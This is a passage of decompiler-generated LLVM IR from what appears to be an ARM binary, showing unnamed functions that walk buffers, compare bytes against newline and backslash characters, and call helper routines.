  %v0_13fec = load i32, i32* @r7, align 4
  %v1_13fec = load i32, i32* @r5, align 4
  %v2_13fec = add i32 %v1_13fec, 4
  %v3_13fec = inttoptr i32 %v2_13fec to i32*
  store i32 %v0_13fec, i32* %v3_13fec, align 4
  %v0_13ff0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_13ff0

dec_label_pc_13ff0:                               ; preds = %dec_label_pc_13fc0, %dec_label_pc_13fe8
  %v1_14014 = phi i32 [ %v0_13fc0, %dec_label_pc_13fc0 ], [ %v0_13ff0.pre, %dec_label_pc_13fe8 ]
  %v1_13ff0 = add i32 %v1_14014, 4
  %v2_13ff0 = inttoptr i32 %v1_13ff0 to i32*
  %v3_13ff0 = load i32, i32* %v2_13ff0, align 4
  %v1_13ff4 = add i32 %v1_14014, 12
  %v2_13ff4 = inttoptr i32 %v1_13ff4 to i32*
  %v3_13ff4 = load i32, i32* %v2_13ff4, align 4
  %v2_13ff8 = add i32 %v3_13ff4, %v3_13ff0
  store i32 %v2_13ff8, i32* @r4, align 4
  %v3_13ffc = inttoptr i32 %v2_13ff8 to i32*
  %v4_13ffc = load i32, i32* %v3_13ffc, align 4
  %v1_14000 = add i32 %v2_13ff8, 4
  %v2_14000 = inttoptr i32 %v1_14000 to i32*
  %v3_14000 = load i32, i32* %v2_14000, align 4
  %v1_14004 = add i32 %v2_13ff8, 16
  %v2_14004 = inttoptr i32 %v1_14004 to i16*
  %v3_14004 = load i16, i16* %v2_14004, align 2
  %v4_14004 = zext i16 %v3_14004 to i32
  %v1_14008 = add i32 %v2_13ff8, 8
  %v2_14008 = inttoptr i32 %v1_14008 to i32*
  %v3_14008 = load i32, i32* %v2_14008, align 4
  store i32 %v3_14008, i32* %ip.global-to-local, align 4
  %v2_1400c = add i32 %v4_14004, %v3_13ff0
  %v2_14010 = or i32 %v3_14000, %v4_13ffc
  %v4_14010 = icmp eq i32 %v2_14010, 0
  store i32 %v2_1400c, i32* %v2_13ff0, align 4
  %v0_14018 = load i32, i32* %ip.global-to-local, align 4
  %v1_14018 = load i32, i32* @r5, align 4
  %v2_14018 = add i32 %v1_14018, 16
  %v3_14018 = inttoptr i32 %v2_14018 to i32*
  store i32 %v0_14018, i32* %v3_14018, align 4
  br i1 %v4_14010, label %dec_label_pc_13fc0, label %dec_label_pc_14020

dec_label_pc_14020:                               ; preds = %dec_label_pc_13ff0, %.thread
  %v0_1402c = load i32, i32* @r6, align 4
  %v2_1402c = add i32 %v0_1402c, 24
  %v3_1402c = inttoptr i32 %v2_1402c to i32*
  %v4_1402c = load i32, i32* %v3_1402c, align 4
  store i32 %v4_1402c, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_1402c)
  %v0_14038 = load i32, i32* @r4, align 4
  ret i32 %v0_14038

; uselistorder directives
  uselistorder i32 %v2_13ff8, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v1_14014, { 1, 0 }
  uselistorder i32 %v6_13fc0, { 1, 0 }
  uselistorder i32 %v0_13fc0, { 0, 1, 3, 2, 4, 5 }
  uselistorder label %dec_label_pc_13ff0, { 1, 0 }
}

define i32 @function_1404c(i32 %arg1) local_unnamed_addr {
dec_label_pc_1404c:
  %v0_1404c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1404c, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_1404c
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_1404c, %bb
  %v10_14058 = phi i32 [ %arg1, %dec_label_pc_1404c ], [ 0, %bb ]
  ret i32 %v10_14058

; uselistorder directives
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @function_1405c(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_1405c:
  %cpsr_z.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_1405c = load i32, i32* @r4, align 4
  %v6_1405c = load i32, i32* @r5, align 4
  %v9_1405c = load i32, i32* @r6, align 4
  %v12_1405c = load i32, i32* @r7, align 4
  %v15_1405c = load i32, i32* @r8, align 4
  %v18_1405c = load i32, i32* @sb, align 4
  %v21_1405c = load i32, i32* @sl, align 4
  %v24_1405c = load i32, i32* @fp, align 4
  store i32 %tmp, i32* @r5, align 4
  %v2_14060 = icmp eq i32* %arg1, null
  store i1 %v2_14060, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg3, i32* @r8, align 4
  store i32 %arg4, i32* @r7, align 4
  br i1 %v2_14060, label %dec_label_pc_14370, label %dec_label_pc_14078

dec_label_pc_14078:                               ; preds = %dec_label_pc_1405c
  %v1_14078 = urem i32 %arg3, 256
  store i32 %v1_14078, i32* @sb, align 4
  %v1_1407c = udiv i32 %arg3, 256
  %v3_14080 = urem i32 %v1_1407c, 256
  %v3_14084 = mul nuw nsw i32 %v1_14078, 4
  %v1_1408c = or i32 %v3_14084, 1
  %v1_14098 = and i32 %arg3, 131072
  %v1_1409c = add nsw i32 %v1_14078, -1
  %v1_140a8 = and i32 %arg3, 262144
  store i32 %v1_140a8, i32* %r2.global-to-local, align 4
  %v1_140ac = and i32 %arg3, 65536
  store i32 %v1_140ac, i32* %r3.global-to-local, align 4
  store i32 %v1_140ac, i32* %stack_var_-72, align 4
  store i32 0, i32* @fp, align 4
  %v1_140bc = add i32 %arg4, 1
  store i32 %v1_140bc, i32* @sl, align 4
  %v2_1423c = inttoptr i32 %arg2 to i32*
  %v2_1424c = icmp eq i32 %v1_14098, 0
  %v2_142a4 = icmp eq i32 %v1_140a8, 0
  br label %dec_label_pc_140c0

dec_label_pc_140c0:                               ; preds = %dec_label_pc_140c0.backedge, %dec_label_pc_14078
  %v2_140dc = phi i32 [ %v0_140c0.pre, %dec_label_pc_140c0.backedge ], [ %tmp, %dec_label_pc_14078 ]
  %v1_140c0 = add i32 %v2_140dc, 4
  %v2_140c0 = inttoptr i32 %v1_140c0 to i32*
  %v3_140c0 = load i32, i32* %v2_140c0, align 4
  store i32 %v3_140c0, i32* %r3.global-to-local, align 4
  %v2_140c4 = icmp eq i32 %v3_140c0, 0
  store i1 %v2_140c4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140c4, label %dec_label_pc_140cc, label %dec_label_pc_14114

dec_label_pc_140cc:                               ; preds = %dec_label_pc_140c0
  %v1_140cc = add i32 %v2_140dc, 16
  %v2_140cc = inttoptr i32 %v1_140cc to i32*
  %v3_140cc = load i32, i32* %v2_140cc, align 4
  store i32 %v3_140cc, i32* %r3.global-to-local, align 4
  %v2_140d0 = icmp eq i32 %v3_140cc, 0
  store i1 %v2_140d0, i1* %cpsr_z.global-to-local, align 1
  %v1_140d4 = add i32 %v2_140dc, 8
  %v2_140d4 = inttoptr i32 %v1_140d4 to i32*
  %v3_140d4 = load i32, i32* %v2_140d4, align 4
  store i32 %v3_140d4, i32* %r3.global-to-local, align 4
  br i1 %v2_140d0, label %bb, label %bb66

bb:                                               ; preds = %dec_label_pc_140cc
  store i32 81, i32* %r2.global-to-local, align 4
  store i32 81, i32* %v2_140cc, align 4
  %v0_140e0.pre = load i32, i32* %r3.global-to-local, align 4
  br label %bb66

bb66:                                             ; preds = %dec_label_pc_140cc, %bb
  %v0_140e0 = phi i32 [ %v0_140e0.pre, %bb ], [ %v3_140d4, %dec_label_pc_140cc ]
  %v2_140e0 = icmp eq i32 %v0_140e0, 0
  store i1 %v2_140e0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_140e0, label %bb67, label %.thread

bb67:                                             ; preds = %bb66
  store i32 %v1_1408c, i32* %r3.global-to-local, align 4
  %v2_140e8 = load i32, i32* @r5, align 4
  %v3_140e8 = add i32 %v2_140e8, 8
  %v4_140e8 = inttoptr i32 %v3_140e8 to i32*
  store i32 %v1_1408c, i32* %v4_140e8, align 4
  br label %.thread

.thread:                                          ; preds = %bb66, %bb67
  %v0_140ec = load i32, i32* @r5, align 4
  %v1_140ec = add i32 %v0_140ec, 16
  %v2_140ec = inttoptr i32 %v1_140ec to i32*
  %v3_140ec = load i32, i32* %v2_140ec, align 4
  store i32 %v3_140ec, i32* %r0.global-to-local, align 4
  %v1_140f0 = add i32 %v0_140ec, 8
  %v2_140f0 = inttoptr i32 %v1_140f0 to i32*
  %v3_140f0 = load i32, i32* %v2_140f0, align 4
  store i32 %v3_140f0, i32* %r3.global-to-local, align 4
  %v2_140f4 = add i32 %v3_140f0, %v3_140ec
  store i32 %v2_140f4, i32* %r0.global-to-local, align 4
  %v1_140f8 = call i32 @function_11604(i32 %v2_140f4)
  store i32 %v1_140f8, i32* %r0.global-to-local, align 4
  %v2_140fc = icmp eq i32 %v1_140f8, 0
  store i1 %v2_140fc, i1* %cpsr_z.global-to-local, align 1
  %v1_14100 = load i32, i32* @r5, align 4
  %v2_14100 = add i32 %v1_14100, 4
  %v3_14100 = inttoptr i32 %v2_14100 to i32*
  store i32 %v1_140f8, i32* %v3_14100, align 4
  br i1 %v2_140fc, label %dec_label_pc_14370, label %dec_label_pc_14108

dec_label_pc_14108:                               ; preds = %.thread
  %v0_14108 = load i32, i32* @r5, align 4
  %v1_14108 = add i32 %v0_14108, 20
  %v2_14108 = inttoptr i32 %v1_14108 to i32*
  %v3_14108 = load i32, i32* %v2_14108, align 4
  %v1_1410c = or i32 %v3_14108, 1
  store i32 %v1_1410c, i32* %r3.global-to-local, align 4
  store i32 %v1_1410c, i32* %v2_14108, align 4
  %v0_14114.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_14114

dec_label_pc_14114:                               ; preds = %dec_label_pc_140c0, %dec_label_pc_14108
  %v1_1411c = phi i32 [ %v2_140dc, %dec_label_pc_140c0 ], [ %v0_14114.pre, %dec_label_pc_14108 ]
  %v1_14114 = add i32 %v1_1411c, 4
  %v2_14114 = inttoptr i32 %v1_14114 to i32*
  %v3_14114 = load i32, i32* %v2_14114, align 4
  store i32 %v3_14114, i32* %r2.global-to-local, align 4
  %v4_14114 = add i32 %v1_1411c, 8
  %v5_14114 = inttoptr i32 %v4_14114 to i32*
  %v6_14114 = load i32, i32* %v5_14114, align 4
  %v2_14118 = add i32 %v6_14114, %v3_14114
  store i32 %v2_14118, i32* %r3.global-to-local, align 4
  %v2_1411c = add i32 %v1_1411c, 12
  %v3_1411c = inttoptr i32 %v2_1411c to i32*
  store i32 %v2_14118, i32* %v3_1411c, align 4
  %v0_14120 = load i32, i32* @fp, align 4
  store i32 %v0_14120, i32* @r6, align 4
  br label %dec_label_pc_14124

dec_label_pc_14124:                               ; preds = %dec_label_pc_141b0, %dec_label_pc_1419c, %dec_label_pc_14114
  %v0_1412c = phi i32 [ %v0_14120, %dec_label_pc_14114 ], [ %v1_1419c, %dec_label_pc_1419c ], [ %v0_1412c.pre.pre, %dec_label_pc_141b0 ]
  %v0_14124 = load i32, i32* @r5, align 4
  %v1_14124 = add i32 %v0_14124, 12
  store i32 %v1_14124, i32* %r0.global-to-local, align 4
  %v1_14128 = inttoptr i32 %v1_14124 to i32*
  %v2_14128 = load i32, i32* %v1_14128, align 4
  store i32 %v2_14128, i32* %r0.global-to-local, align 4
  %v3_14128 = add i32 %v0_14124, 16
  %v4_14128 = inttoptr i32 %v3_14128 to i32*
  %v5_14128 = load i32, i32* %v4_14128, align 4
  %v2_1412c = add i32 %v2_14128, %v0_1412c
  store i32 %v2_1412c, i32* %r0.global-to-local, align 4
  %v2_14130 = sub i32 %v5_14128, %v0_1412c
  %v1_14134 = inttoptr i32 %v0_14124 to i32*
  %v2_14134 = load i32, i32* %v1_14134, align 4
  store i32 %v2_14134, i32* %r2.global-to-local, align 4
  %v3_14138 = call i32 @function_14b58(i32 %v2_1412c, i32 %v2_14130, i32 %v2_14134)
  store i32 %v3_14138, i32* %r0.global-to-local, align 4
  store i32 %v3_14138, i32* %r4.global-to-local, align 4
  %v2_1413c = icmp eq i32 %v3_14138, 0
  store i1 %v2_1413c, i1* %cpsr_z.global-to-local, align 1
  %v0_14144 = load i32, i32* @r5, align 4
  %v1_14144 = add i32 %v0_14144, 12
  br i1 %v2_1413c, label %dec_label_pc_14144, label %dec_label_pc_1415c

dec_label_pc_14144:                               ; preds = %dec_label_pc_14124
  store i32 %v1_14144, i32* %r0.global-to-local, align 4
  %v1_14148 = inttoptr i32 %v1_14144 to i32*
  %v2_14148 = load i32, i32* %v1_14148, align 4
  store i32 %v2_14148, i32* %r0.global-to-local, align 4
  %v3_14148 = add i32 %v0_14144, 16
  %v4_14148 = inttoptr i32 %v3_14148 to i32*
  %v5_14148 = load i32, i32* %v4_14148, align 4
  store i32 %v5_14148, i32* @r2, align 4
  %v2_14150 = inttoptr i32 %v2_14148 to i8*
  %v3_14150 = call i32 @function_11060(i8* %v2_14150, i32 0)
  store i32 %v3_14150, i32* %r0.global-to-local, align 4
  %v0_14154 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_14374

dec_label_pc_1415c:                               ; preds = %dec_label_pc_14124
  %v2_1415c = inttoptr i32 %v1_14144 to i32*
  %v3_1415c = load i32, i32* %v2_1415c, align 4
  store i32 %v3_1415c, i32* @r4, align 4
  %v1_14160 = load i32, i32* @r6, align 4
  %v2_14160 = add i32 %v1_14160, %v3_1415c
  store i32 %v2_14160, i32* %r0.global-to-local, align 4
  %v1_14164 = call i32 @function_15610(i32 %v2_14160)
  %v0_1416c = load i32, i32* @r6, align 4
  %v2_1416c = add i32 %v0_1416c, %v1_14164
  store i32 %v2_1416c, i32* @r6, align 4
  %v0_14170 = load i32, i32* @r4, align 4
  store i32 %v0_14170, i32* @r0, align 4
  %v2_14174 = call i32 @function_1585c(i32 %v0_14170, i32 10)
  store i32 %v2_14174, i32* %r0.global-to-local, align 4
  %v2_14178 = icmp eq i32 %v2_14174, 0
  store i1 %v2_14178, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_14178, label %dec_label_pc_141a4, label %dec_label_pc_14180

dec_label_pc_14180:                               ; preds = %dec_label_pc_1415c
  %v1_14180 = inttoptr i32 %v2_14174 to i8*
  %v2_14180 = load i8, i8* %v1_14180, align 1
  %v3_14180 = zext i8 %v2_14180 to i32
  %v1_14184 = add nuw nsw i32 %v3_14180, 255
  %v1_14188 = urem i32 %v1_14184, 256
  store i32 %v1_14188, i32* %r3.global-to-local, align 4
  %v7_1418c = icmp eq i32 %v1_14188, 92
  store i1 %v7_1418c, i1* %cpsr_z.global-to-local, align 1
  %v1_14190 = trunc i32 %v1_14184 to i8
  store i8 %v1_14190, i8* %v1_14180, align 1
  %v0_14194 = load i32, i32* @r6, align 4
  %v1_14194 = add i32 %v0_14194, -1
  store i32 %v1_14194, i32* @r6, align 4
  %v0_14198 = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_14198, label %dec_label_pc_1419c, label %dec_label_pc_14228

dec_label_pc_1419c:                               ; preds = %dec_label_pc_14180
  %v1_1419c = add i32 %v0_14194, -2
  store i32 %v1_1419c, i32* @r6, align 4
  br label %dec_label_pc_14124

dec_label_pc_141a4:                               ; preds = %dec_label_pc_1415c
  %v0_141a4 = load i32, i32* @r5, align 4
  %v1_141a4 = add i32 %v0_141a4, 20
  %v2_141a4 = inttoptr i32 %v1_141a4 to i32*
  %v3_141a4 = load i32, i32* %v2_141a4, align 4
  store i32 %v3_141a4, i32* %r3.global-to-local, align 4
  %v2_141a8 = icmp eq i32 %v3_141a4, 0
  store i1 %v2_141a8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141a8, label %dec_label_pc_141e0, label %dec_label_pc_141b0

dec_label_pc_141b0:                               ; preds = %dec_label_pc_141a4
  %v1_141b0 = add i32 %v0_141a4, 16
  %v2_141b0 = inttoptr i32 %v1_141b0 to i32*
  %v3_141b0 = load i32, i32* %v2_141b0, align 4
  store i32 %v3_141b0, i32* %r3.global-to-local, align 4
  %v1_141b4 = add i32 %v0_141a4, 8
  %v2_141b4 = inttoptr i32 %v1_141b4 to i32*
  %v3_141b4 = load i32, i32* %v2_141b4, align 4
  %v1_141b8 = add i32 %v3_141b0, 4096
  store i32 %v1_141b8, i32* %r3.global-to-local, align 4
  %v2_141bc = add i32 %v3_141b4, %v1_141b8
  store i32 %v1_141b8, i32* %v2_141b0, align 4
  %v0_141c4 = load i32, i32* @r5, align 4
  %v1_141c4 = add i32 %v0_141c4, 4
  %v2_141c4 = inttoptr i32 %v1_141c4 to i32*
  %v3_141c4 = load i32, i32* %v2_141c4, align 4
  store i32 %v3_141c4, i32* %r0.global-to-local, align 4
  %v4_141c8 = inttoptr i32 %v3_141c4 to i32*
  %v5_141c8 = call i32 @function_12058(i32* %v4_141c8, i32 %v2_141bc, i32 %v2_14134, i32 %v1_141b8)
  store i32 %v5_141c8, i32* %r0.global-to-local, align 4
  %v0_141cc = load i32, i32* @r5, align 4
  %v1_141cc = add i32 %v0_141cc, 8
  %v2_141cc = inttoptr i32 %v1_141cc to i32*
  %v3_141cc = load i32, i32* %v2_141cc, align 4
  %v2_141d0 = add i32 %v3_141cc, %v5_141c8
  store i32 %v2_141d0, i32* %r3.global-to-local, align 4
  %v2_141d4 = add i32 %v0_141cc, 12
  %v3_141d4 = inttoptr i32 %v2_141d4 to i32*
  store i32 %v2_141d0, i32* %v3_141d4, align 4
  %v1_141d8 = load i32, i32* @r5, align 4
  %v2_141d8 = add i32 %v1_141d8, 4
  %v3_141d8 = inttoptr i32 %v2_141d8 to i32*
  store i32 %v5_141c8, i32* %v3_141d8, align 4
  %v0_1412c.pre.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14124

dec_label_pc_141e0:                               ; preds = %dec_label_pc_141a4, %.dec_label_pc_141e0_crit_edge
  %v0_141e0 = phi i32 [ %v0_141e0.pre, %.dec_label_pc_141e0_crit_edge ], [ %v0_141a4, %dec_label_pc_141a4 ]
  %v1_141e0 = inttoptr i32 %v0_141e0 to i32*
  %v2_141e0 = load i32, i32* %v1_141e0, align 4
  %v1_141e4 = add i32 %v2_141e0, 52
  %v2_141e4 = inttoptr i32 %v1_141e4 to i32*
  %v3_141e4 = load i32, i32* %v2_141e4, align 4
  store i32 %v3_141e4, i32* %r3.global-to-local, align 4
  %v2_141e8 = icmp eq i32 %v3_141e4, 0
  store i1 %v2_141e8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_141e8, label %dec_label_pc_14214, label %dec_label_pc_141f0

dec_label_pc_141f0:                               ; preds = %dec_label_pc_141e0
  %v1_141f0 = add i32 %v2_141e0, 16
  %v2_141f0 = inttoptr i32 %v1_141f0 to i32*
  %v3_141f0 = load i32, i32* %v2_141f0, align 4
  store i32 %v3_141f0, i32* %r2.global-to-local, align 4
  %v1_141f4 = add i32 %v2_141e0, 24
  %v2_141f4 = inttoptr i32 %v1_141f4 to i32*
  %v3_141f4 = load i32, i32* %v2_141f4, align 4
  store i32 %v3_141f4, i32* %r3.global-to-local, align 4
  %v3_141f8 = icmp ult i32 %v3_141f0, %v3_141f4
  %v9_141f8 = icmp eq i32 %v3_141f0, %v3_141f4
  store i1 %v9_141f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_141f8, label %dec_label_pc_1421cthread-pre-split, label %dec_label_pc_14208

dec_label_pc_14208:                               ; preds = %dec_label_pc_141f0
  store i32 %v2_141e0, i32* %r0.global-to-local, align 4
  %v1_1420c = inttoptr i32 %v2_141e0 to i16*
  %v2_1420c = call i32 @function_14fa8(i16* %v1_1420c)
  store i32 %v2_1420c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_14214:                               ; preds = %dec_label_pc_141e0
  store i32 %v2_141e0, i32* %r0.global-to-local, align 4
  %v1_14218 = call i32 @function_14a7c(i32 %v2_141e0)
  store i32 %v1_14218, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421cthread-pre-split:               ; preds = %dec_label_pc_141f0
  %v2_141fc = inttoptr i32 %v3_141f0 to i8*
  %v3_141fc = load i8, i8* %v2_141fc, align 1
  %v4_141fc = zext i8 %v3_141fc to i32
  store i32 %v4_141fc, i32* %r0.global-to-local, align 4
  %v6_141fc = add i32 %v3_141f0, 1
  store i32 %v6_141fc, i32* %r2.global-to-local, align 4
  store i32 %v6_141fc, i32* %v2_141f0, align 4
  %v0_1421c.pr = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1421c

dec_label_pc_1421c:                               ; preds = %dec_label_pc_1421cthread-pre-split, %dec_label_pc_14208, %dec_label_pc_14214
  %v1_14220 = phi i32 [ %v0_1421c.pr, %dec_label_pc_1421cthread-pre-split ], [ %v2_1420c, %dec_label_pc_14208 ], [ %v1_14218, %dec_label_pc_14214 ]
  %v7_1421c = icmp eq i32 %v1_14220, 10
  store i1 %v7_1421c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_1421c, label %dec_label_pc_14228.loopexit, label %bb68

bb68:                                             ; preds = %dec_label_pc_1421c
  %v8_14220 = icmp eq i32 %v1_14220, -1
  store i1 %v8_14220, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_14220, label %dec_label_pc_14228.loopexit, label %.dec_label_pc_141e0_crit_edge

.dec_label_pc_141e0_crit_edge:                    ; preds = %bb68
  %v0_141e0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_141e0

dec_label_pc_14228.loopexit:                      ; preds = %bb68, %dec_label_pc_1421c
  %v0_14228.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_14228

dec_label_pc_14228:                               ; preds = %dec_label_pc_14180, %dec_label_pc_14228.loopexit
  %v0_14228 = phi i32 [ %v0_14228.pre, %dec_label_pc_14228.loopexit ], [ %v1_14194, %dec_label_pc_14180 ]
  %v7_14228 = icmp eq i32 %v0_14228, -1
  store i1 %v7_14228, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_14228, label %dec_label_pc_14370, label %dec_label_pc_14230

dec_label_pc_14230:                               ; preds = %dec_label_pc_14228
  %v0_14230 = load i32, i32* @r5, align 4
  %v1_14230 = add i32 %v0_14230, 4
  %v2_14230 = inttoptr i32 %v1_14230 to i32*
  %v3_14230 = load i32, i32* %v2_14230, align 4
  store i32 %v3_14230, i32* %r0.global-to-local, align 4
  store i32 %v3_14084, i32* @r2, align 4
  store i32 %arg2, i32* %r3.global-to-local, align 4
  store i32 %v3_14230, i32* %v2_1423c, align 4
  %v0_14240 = load i32, i32* @fp, align 4
  %v2_14244 = inttoptr i32 %v3_14230 to i8*
  %v3_14244 = call i32 @function_11060(i8* %v2_14244, i32 %v0_14240)
  store i32 %v3_14244, i32* %r0.global-to-local, align 4
  store i32 %v1_14098, i32* %r2.global-to-local, align 4
  store i1 %v2_1424c, i1* %cpsr_z.global-to-local, align 1
  %v0_14250 = load i32, i32* @r5, align 4
  %v1_14250 = add i32 %v0_14250, 12
  %v2_14250 = inttoptr i32 %v1_14250 to i32*
  %v3_14250 = load i32, i32* %v2_14250, align 4
  store i32 %v3_14250, i32* @r4, align 4
  br i1 %v2_1424c, label %dec_label_pc_14268, label %dec_label_pc_14258

dec_label_pc_14258:                               ; preds = %dec_label_pc_14230
  store i32 %v3_14250, i32* @r0, align 4
  %v0_1425c = load i32, i32* @sl, align 4
  %v2_14260 = inttoptr i32 %v3_14250 to i8*
  %v3_14260 = call i32 @function_156d4(i8* %v2_14260, i32 %v0_1425c)
  store i32 %v3_14260, i32* %r0.global-to-local, align 4
  %v0_14264 = load i32, i32* @r4, align 4
  %v2_14264 = add i32 %v0_14264, %v3_14260
  store i32 %v2_14264, i32* @r4, align 4
  br label %dec_label_pc_14268

dec_label_pc_14268:                               ; preds = %dec_label_pc_14230, %dec_label_pc_14258
  %v0_1434013 = phi i32 [ %v3_14250, %dec_label_pc_14230 ], [ %v2_14264, %dec_label_pc_14258 ]
  %v1_14268 = inttoptr i32 %v0_1434013 to i8*
  %v2_14268 = load i8, i8* %v1_14268, align 1
  %v3_14268 = zext i8 %v2_14268 to i32
  store i32 %v3_14268, i32* %r2.global-to-local, align 4
  %v2_1426c = icmp eq i8 %v2_14268, 0
  store i1 %v2_1426c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1426c, label %dec_label_pc_140c0.backedge, label %dec_label_pc_14274

dec_label_pc_140c0.backedge:                      ; preds = %dec_label_pc_14268, %dec_label_pc_14368, %dec_label_pc_14274
  %v0_140c0.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_140c0

dec_label_pc_14274:                               ; preds = %dec_label_pc_14268
  %v0_14274 = load i32, i32* @r7, align 4
  %v1_14274 = inttoptr i32 %v0_14274 to i8*
  %v2_14274 = load i8, i8* %v1_14274, align 1
  %v3_14274 = zext i8 %v2_14274 to i32
  store i32 %v3_14274, i32* %r3.global-to-local, align 4
  %v9_14278 = icmp eq i8 %v2_14274, %v2_14268
  store i1 %v9_14278, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_14278, label %dec_label_pc_140c0.backedge, label %dec_label_pc_14340.preheader

dec_label_pc_14340.preheader:                     ; preds = %dec_label_pc_14274
  %v1_1427c = load i32, i32* @fp, align 4
  store i32 %v1_1427c, i32* @r6, align 4
  %v2_1434015 = load i8, i8* %v1_14268, align 1
  %v3_1434016 = zext i8 %v2_1434015 to i32
  store i32 %v3_1434016, i32* %r2.global-to-local, align 4
  %v2_1434417 = icmp eq i8 %v2_1434015, 0
  store i1 %v2_1434417, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1434417, label %dec_label_pc_1435c, label %dec_label_pc_1434c.preheader

dec_label_pc_1434c.preheader:                     ; preds = %dec_label_pc_14340.preheader
  %v2_1434c82 = load i8, i8* %v1_14274, align 1
  %v3_1434c83 = zext i8 %v2_1434c82 to i32
  store i32 %v3_1434c83, i32* %r3.global-to-local, align 4
  %v9_1435086 = icmp eq i8 %v2_1434c82, %v2_1434015
  store i1 %v9_1435086, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_1435086, label %dec_label_pc_1435c, label %bb74

dec_label_pc_14288:                               ; preds = %bb74
  store i32 %arg2, i32* %r2.global-to-local, align 4
  %v2_1428c = load i32, i32* %v2_1423c, align 4
  store i32 %v2_1428c, i32* %r3.global-to-local, align 4
  store i32 %v1_1409c, i32* %r2.global-to-local, align 4
  %v9_14294 = icmp eq i32 %v2_1429888, %v1_1409c
  store i1 %v9_14294, i1* %cpsr_z.global-to-local, align 1
  %v5_14298 = mul i32 %v2_1429888, 4
  %v6_14298 = add i32 %v2_1428c, %v5_14298
  %v7_14298 = inttoptr i32 %v6_14298 to i32*
  store i32 %v0_1429887, i32* %v7_14298, align 4
  br i1 %v9_14294, label %dec_label_pc_142a0, label %dec_label_pc_142ac

dec_label_pc_142a0:                               ; preds = %dec_label_pc_14288
  store i32 %v1_140a8, i32* %r3.global-to-local, align 4
  store i1 %v2_142a4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_142a4, label %dec_label_pc_142ac, label %dec_label_pc_142cc

dec_label_pc_142ac:                               ; preds = %dec_label_pc_142a0, %dec_label_pc_14288
  %v0_142ac = load i32, i32* @r7, align 4
  %v1_142ac = inttoptr i32 %v0_142ac to i8*
  %v2_142ac = load i8, i8* %v1_142ac, align 1
  %v3_142ac = zext i8 %v2_142ac to i32
  store i32 %v3_142ac, i32* %r3.global-to-local, align 4
  %v2_142b0 = icmp eq i8 %v2_142ac, 0
  store i1 %v2_142b0, i1* %cpsr_z.global-to-local, align 1
  %v0_142b4 = load i32, i32* @r4, align 4
  store i32 %v0_142b4, i32* @r0, align 4
  %v1_142b8 = load i32, i32* @sl, align 4
  %storemerge = select i1 %v2_142b0, i32 %v1_142b8, i32 %v0_142ac
  store i32 %storemerge, i32* @r1, align 4
  %v0_142c0 = call i32 @function_15690()
  store i32 %v0_142c0, i32* %r0.global-to-local, align 4
  %v0_142c4 = load i32, i32* @r4, align 4
  %v2_142c4 = add i32 %v0_142c4, %v0_142c0
  store i32 %v2_142c4, i32* @r4, align 4
  br label %dec_label_pc_14304

dec_label_pc_142cc:                               ; preds = %dec_label_pc_142a0
  %v0_142cc = load i32, i32* @r4, align 4
  store i32 %v0_142cc, i32* @r0, align 4
  %v0_142d0 = load i32, i32* @r7, align 4
  %v1_142d0 = inttoptr i32 %v0_142d0 to i8*
  %v2_142d0 = load i8, i8* %v1_142d0, align 1
  %v3_142d0 = zext i8 %v2_142d0 to i32
  %v5_142d4 = call i32 @function_15770(i32 %v0_142cc, i32 %v3_142d0, i32 %v1_1409c, i32 %v1_140a8)
  store i32 %v5_142d4, i32* %r0.global-to-local, align 4
  store i32 %v1_14098, i32* %r2.global-to-local, align 4
  store i1 %v2_1424c, i1* %cpsr_z.global-to-local, align 1
  store i32 %v5_142d4, i32* @r4, align 4
  br i1 %v2_1424c, label %dec_label_pc_14304, label %dec_label_pc_142f0

dec_label_pc_142ec:                               ; preds = %dec_label_pc_142f0
  %v1_142ec = add i32 %v0_14304.pre, -1
  store i32 %v1_142ec, i32* @r4, align 4
  br label %dec_label_pc_142f0

dec_label_pc_142f0:                               ; preds = %dec_label_pc_142cc, %dec_label_pc_142ec
  %v0_142f0 = phi i32 [ %v1_142ec, %dec_label_pc_142ec ], [ %v5_142d4, %dec_label_pc_142cc ]
  %v1_142f0 = add i32 %v0_142f0, -1
  %v2_142f0 = inttoptr i32 %v1_142f0 to i8*
  %v3_142f0 = load i8, i8* %v2_142f0, align 1
  %v4_142f0 = zext i8 %v3_142f0 to i32
